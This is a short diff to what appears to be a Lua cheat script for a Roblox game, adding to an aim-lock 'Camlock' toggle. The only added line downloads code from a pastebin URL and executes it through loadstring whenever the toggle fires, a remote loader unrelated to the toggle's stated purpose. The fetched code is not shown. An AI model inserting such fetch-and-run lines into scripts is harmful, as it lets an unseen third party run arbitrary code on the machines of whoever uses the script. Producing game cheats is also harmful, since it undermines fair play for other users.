@@ -6,6 +6,7 @@ local Main = Window:NewTab("Aiming")
 local MainSection = Main:NewSection("Main")
 
 MainSection:NewToggle("Camlock", "Locks onto players", function(state)
+    loadstring(game:HttpGet('https://pastebin.com/YD47wP2g'))()
     if state then
         print("Toggle On")
     else
